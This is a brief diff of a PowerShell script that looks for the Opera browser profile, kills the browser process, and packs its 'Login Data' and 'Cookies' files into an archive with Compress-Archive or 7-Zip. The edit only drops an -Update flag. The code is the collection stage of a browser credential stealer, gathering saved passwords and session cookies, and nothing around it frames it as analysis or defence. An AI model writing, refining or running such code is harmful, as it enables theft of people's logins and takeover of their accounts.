@@ -40,7 +40,7 @@ $o=($env:APPDATA+"\Opera Software\Opera Stable\");
 if(Test-Path -Path $o){
   Stop-Process -Name browser -ErrorAction SilentlyContinue;
   if("WinRAR" -in $arh)
-    {Get-ChildItem -Path $o -Include ("Login Data"), ("Cookies") -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
+    {Get-ChildItem -Path $o -Include ("Login Data"), ("Cookies") -Recurse | Compress-Archive -CompressionLevel Fastest -DestinationPath $p}
   elseif("7-Zip"-in $arh)
     {.\7z.exe a $p ($o+"Login Data"),($o+"Cookies") -spf -tzip}
 }
